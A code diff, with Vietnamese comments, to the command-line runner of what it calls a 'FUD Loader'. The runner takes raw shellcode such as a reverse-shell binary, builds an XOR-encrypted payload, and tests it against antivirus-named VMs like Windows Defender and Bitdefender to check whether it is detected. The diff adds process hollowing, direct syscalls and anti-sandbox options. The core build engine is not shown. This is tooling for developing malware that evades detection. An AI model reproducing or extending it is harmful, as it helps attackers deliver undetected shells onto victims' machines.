@@ -1,41 +1,59 @@
 import argparse
 import os
-import core_engine # Import engine cốt lõi của chúng ta
+import core_engine 
 
 def main():
-    # Định nghĩa các đối số dòng lệnh mà người dùng có thể nhập
     parser = argparse.ArgumentParser(description="FUD Loader - Command-Line Test Runner")
+    
+    # --- Input & Build Options ---
     parser.add_argument("-s", "--shellcode", required=True, help="Path to the raw shellcode file (e.g., shellcodes/revshell_x64.bin)")
     parser.add_argument("-e", "--encryption", default="xor", choices=["none", "xor"], help="Encryption method to use.")
-    parser.add_argument("-i", "--injection", default="classic", choices=["classic"], help="Injection technique to use.")
-    parser.add_argument("-v", "--vms", required=True, nargs='+', help="List of VMs to test on, separated by spaces (e.g., \"Windows Defender\" Bitdefender).")
+    parser.add_argument("-i", "--injection", default="classic", choices=["classic", "hollowing"], help="Injection technique to use.")
+    parser.add_argument("--api-method", default="winapi", choices=["winapi", "syscalls"], help="Method for calling Windows APIs.")
+    
+    # --- Evasion & Debug Options ---
+    parser.add_argument("--anti-evasion", action="store_true", help="Enable anti-analysis and anti-sandbox checks.")
     parser.add_argument("--debug", action="store_true", help="Build the payload in debug mode (with popups).")
+
+    # --- Test Execution Options ---
+    parser.add_argument("-v", "--vms", nargs='*', help="List of VMs to test on (e.g., \"Windows Defender\"). Not required if --build-only is used.")
+    
+    # --- THAY ĐỔI 1: THÊM CỜ MỚI ---
+    parser.add_argument("--build-only", action="store_true", help="Only build the payload and exit without running tests.")
 
     args = parser.parse_args()
 
-    # --- Bắt đầu quy trình ---
+    # --- THAY ĐỔI 2: KIỂM TRA LOGIC ĐIỀU KIỆN ---
+    # Nếu không phải chỉ build, thì phải có VM để test
+    if not args.build_only and not args.vms:
+        parser.error("-v/--vms is required unless --build-only is specified.")
+
+    # --- START ---
     print("="*50)
     print("      FUD AUTOMATED TEST RUNNER - CLI MODE")
     print("="*50)
 
-    # 1. Kiểm tra xem tên VM người dùng nhập có trong config không
-    for vm_name in args.vms:
-        if vm_name not in core_engine.VMS_CONFIG:
-            print(f"[!] Error: VM name '{vm_name}' is not defined in core_engine.py's VMS_CONFIG.")
-            return
-
-    # 2. Xây dựng payload
-    build_options = {
-        'encryption': args.encryption,
-        'injection': args.injection,
-        'debug': args.debug
-    }
+    # 1. Xây dựng payload (luôn thực hiện)
+    build_options = vars(args)
     
     payload_path = core_engine.build_payload(args.shellcode, build_options)
 
     if not payload_path:
-        print("[!] Payload build failed. Aborting test run.")
+        print("\n[!] Payload build failed. Aborting.")
         return
+    
+    print(f"\n[SUCCESS] Payload built successfully at: {payload_path}")
+
+    # --- THAY ĐỔI 3: DỪNG LẠI NẾU CHỈ BUILD ---
+    if args.build_only:
+        print("\n--build-only flag detected. Exiting now.")
+        return
+
+    # 2. Kiểm tra xem tên VM người dùng nhập có trong config không
+    for vm_name in args.vms:
+        if vm_name not in core_engine.VMS_CONFIG:
+            print(f"[!] Error: VM name '{vm_name}' is not defined in core_engine.py's VMS_CONFIG.")
+            return
 
     # 3. Chạy test trên từng VM đã chọn
     all_results = {}
@@ -49,11 +67,16 @@ def main():
     print("="*50)
     for vm_name, result in all_results.items():
         print(f"--- VM: {vm_name} ---")
-        print(f"Status: {result['status']}")
-        if result['status'] == 'FAILED':
-            print("Log Details:")
-            print(result['log'])
+        # Đảm bảo result không phải là None
+        if result:
+            print(f"Status: {result.get('status', 'UNKNOWN')}")
+            if 'FAILED' in result.get('status', ''):
+                print("Log Details:")
+                print(result.get('log', 'No log details available.'))
+        else:
+            print("Status: ERROR - Test did not return a result.")
         print("-" * (len(vm_name) + 8))
+
 
 if __name__ == "__main__":
     # Đảm bảo các thư mục cần thiết tồn tại
